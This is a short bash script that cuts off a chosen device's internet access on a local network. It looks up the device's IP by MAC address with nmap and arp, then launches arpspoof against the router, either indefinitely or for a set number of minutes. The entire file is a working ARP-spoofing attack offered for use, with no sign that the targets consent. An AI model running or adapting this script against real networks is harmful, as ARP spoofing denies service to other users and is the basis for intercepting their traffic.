#!/bin/bash
# Examples:
# Activate spoofing given a MAC address
# ./control_internet AA:BB:CC:DD:EE:FF on
# Deactivate spoofing given a MAC address
# ./control_internet AA:BB:CC:DD:EE:FF off
# Activate spoofing for 10 minutes given a MAC address
# ./control_internet AA:BB:CC:DD:EE:FF 10
MAC_ADDR=$1
INTERFACE=eth0
ROUTER_ADDR=192.168.1.1
if [ "$2" = "on" ]
then
    # Activating manual spoof
    IP_ADDR=$(nmap -sP ${ROUTER_ADDR}/24 >/dev/null && arp -an | grep ${MAC_ADDR} | awk '{print $2}' | sed 's/[()]//g')
    sudo arpspoof -i ${INTERFACE} -t ${IP_ADDR} ${ROUTER_ADDR} > /dev/null 2>&1 & echo $! > /tmp/manualspoof-${MAC_ADDR}.pid
elif [ "$2" = "off" ]
then
    # Deactivating manual spoof
    sudo pkill -P `cat /tmp/manualspoof-${MAC_ADDR}.pid`
    rm /tmp/manualspoof-${MAC_ADDR}.pid
else
    # Activate temporarily spoof
    CUT_TIME=$2
    IP_ADDR=$(nmap -sP ${ROUTER_ADDR}/24 >/dev/null && arp -an | grep ${MAC_ADDR} | awk '{print $2}' | sed 's/[()]//g')
    sudo arpspoof -i ${INTERFACE} -t ${IP_ADDR} ${ROUTER_ADDR} > /dev/null 2>&1 & echo $! > /tmp/progspoof-${MAC_ADDR}.pid
    sleep ${CUT_TIME}m
    sudo pkill -P `cat /tmp/progspoof-${MAC_ADDR}.pid`
    rm /tmp/progspoof-${MAC_ADDR}.pid
fi
